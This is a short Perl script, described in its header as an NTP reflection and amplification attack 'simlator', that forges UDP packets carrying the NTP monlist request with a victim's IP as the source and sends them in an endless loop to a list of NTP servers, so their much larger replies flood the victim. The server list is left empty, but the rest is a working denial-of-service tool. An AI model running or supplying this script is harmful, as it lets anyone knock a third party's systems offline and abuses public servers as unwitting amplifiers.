#!/usr/bin/perl
# NTP Reflection and Amplification attack simlator
#
#
# use: ./ddos_ntp <target_ip_address>
#
# Description:
#
# Sends spoofed ntp monlist packets to ntp servers
# defined in @ntpservers (one per line)
#
# attacker -> spoofed 36 byte packet  (this includes all headers) -> ntp servers
# ntp servers --> ntpmonlist response (up to 100 responses of 482 bytes each)
#
use Net::RawIP;

if ($ARGV[0] eq '') { print "Use: $0 <IP>\n"; exit; }

@ntpservers = qw(
	);
my $target = "$ARGV[0]";

my $ntp_monlist = "\x17\x00\x03\x2a\x00\x00\x00\x00";
my $sock =  new Net::RawIP({udp=>{}});
while () {
        for (my $i=0; $i < @ntpservers; $i++) {
                $sock->set({ip => {saddr => $target, daddr => $ntpservers[$i]},udp => {source => 123,dest => 123, data=>$ntp_monlist} });
                $sock->send;
        }
}
